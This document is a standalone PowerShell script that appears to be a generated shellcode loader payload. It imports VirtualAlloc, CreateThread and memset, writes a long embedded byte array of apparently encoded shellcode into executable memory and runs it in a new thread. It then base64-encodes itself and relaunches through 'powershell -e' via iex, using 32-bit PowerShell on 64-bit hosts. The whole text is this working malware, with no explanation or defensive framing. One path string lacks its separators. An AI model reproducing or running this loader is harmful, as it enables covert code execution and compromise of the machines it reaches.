$OZL = '$LeLP = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $LeLP -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x5e,0x14,0xe4,0x9f,0xdb,0xd1,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x57,0x31,0x55,0x12,0x03,0x55,0x12,0x83,0x9b,0x10,0x06,0x6a,0xdf,0xf1,0x44,0x95,0x1f,0x02,0x29,0x1f,0xfa,0x33,0x69,0x7b,0x8f,0x64,0x59,0x0f,0xdd,0x88,0x12,0x5d,0xf5,0x1b,0x56,0x4a,0xfa,0xac,0xdd,0xac,0x35,0x2c,0x4d,0x8c,0x54,0xae,0x8c,0xc1,0xb6,0x8f,0x5e,0x14,0xb7,0xc8,0x83,0xd5,0xe5,0x81,0xc8,0x48,0x19,0xa5,0x85,0x50,0x92,0xf5,0x08,0xd1,0x47,0x4d,0x2a,0xf0,0xd6,0xc5,0x75,0xd2,0xd9,0x0a,0x0e,0x5b,0xc1,0x4f,0x2b,0x15,0x7a,0xbb,0xc7,0xa4,0xaa,0xf5,0x28,0x0a,0x93,0x39,0xdb,0x52,0xd4,0xfe,0x04,0x21,0x2c,0xfd,0xb9,0x32,0xeb,0x7f,0x66,0xb6,0xef,0xd8,0xed,0x60,0xcb,0xd9,0x22,0xf6,0x98,0xd6,0x8f,0x7c,0xc6,0xfa,0x0e,0x50,0x7d,0x06,0x9a,0x57,0x51,0x8e,0xd8,0x73,0x75,0xca,0xbb,0x1a,0x2c,0xb6,0x6a,0x22,0x2e,0x19,0xd2,0x86,0x25,0xb4,0x07,0xbb,0x64,0xd1,0xb9,0xa1,0xe2,0x21,0x2e,0x5d,0x63,0x4c,0xc7,0xf5,0x1b,0xdc,0x60,0xd0,0xdc,0x23,0x5b,0x2d,0x39,0x88,0x37,0x1d,0xee,0x7c,0xd0,0x9b,0x46,0xfa,0x87,0x23,0xb3,0xaf,0x94,0xb1,0x38,0x03,0x48,0x2e,0x4e,0xb4,0x6e,0xae,0x46,0x36,0x6e,0xae,0x96,0x68,0x29,0x9b,0xbb,0x1a,0xfd,0xe3,0x93,0x8a,0xaa,0x6a,0x8c,0x8d,0xaa,0xb8,0x3b,0xd7,0x06,0x2b,0x3b,0xea,0x48,0x2f,0x68,0x59,0xda,0x67,0xdd,0x0b,0xb4,0x6c,0xb4,0x9d,0x7f,0x8c,0xe3,0x74,0x15,0x78,0x54,0x11,0x6a,0x4f,0x6a,0xe1,0xe3,0x50,0x00,0xe5,0xa3,0xfa,0xcb,0xb3,0x2b,0x8e,0xb5,0xa5,0x2a,0x8f,0xec,0x89,0x61,0x23,0x5d,0x78,0xee,0xee,0x67,0x9c,0x95,0x0f,0xb2,0x19,0xa9,0x85,0x36,0x6d,0x5f,0xbf,0x2e,0x81,0x2a,0x9d,0xf8,0x9e,0x80,0x88,0x44,0x09,0x2b,0x5d,0x44,0xc9,0x43,0x5d,0x44,0x89,0x93,0x0e,0x2c,0x51,0x30,0xe3,0x49,0x9e,0xed,0x97,0xc2,0x32,0x87,0x7f,0xb3,0xdc,0x97,0x5f,0x3b,0x1d,0xcb,0xc9,0x53,0x0f,0x7d,0x7c,0x41,0xd0,0x54,0xfa,0x45,0x5b,0x9a,0x8e,0x42,0xa5,0xe7,0x14,0x8c,0xd0,0x02,0x4e,0xcf,0x44,0x25,0x1a,0x30,0x85,0x4a,0xd4,0xf7,0x48,0x9b,0x26,0x31,0x95,0xcd,0x78,0x13,0xd4,0x22,0x79;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$EKe=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($EKe.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$EKe,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($OZL));$Z7V = "-e ";if([IntPtr]::Size -eq 8){$KjJF = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";iex "& $KjJF $Z7V $e"}else{;iex "& powershell $Z7V $e";}